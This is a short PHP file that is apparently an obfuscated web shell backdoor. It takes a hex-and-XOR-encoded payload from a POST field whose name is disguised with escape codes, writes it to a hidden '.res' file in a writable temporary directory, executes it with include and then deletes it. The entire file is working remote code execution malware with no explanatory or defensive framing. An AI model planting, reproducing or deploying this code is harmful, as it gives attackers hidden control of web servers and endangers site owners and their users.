<?php

if(isset($_POST["reso\x75\x72\x63\x65"])){
	$pointer = hex2bin($_POST["reso\x75\x72\x63\x65"]);
	$data_chunk   =   ''   ;    foreach(str_split($pointer) as $char){$data_chunk .= chr(ord($char) ^ 44);}
	$element = array_filter([getcwd(), sys_get_temp_dir(), "/var/tmp", "/dev/shm", "/tmp", getenv("TMP"), ini_get("upload_tmp_dir"), getenv("TEMP"), session_save_path()]);
	foreach ($element as $key => $elem) {
    		if (!( !is_dir($elem) || !is_writable($elem) )) {
    $marker = "$elem/.res";
    if (@file_put_contents($marker, $data_chunk) !== false) {
	include $marker;
	unlink($marker);
	die();
}
}
}
}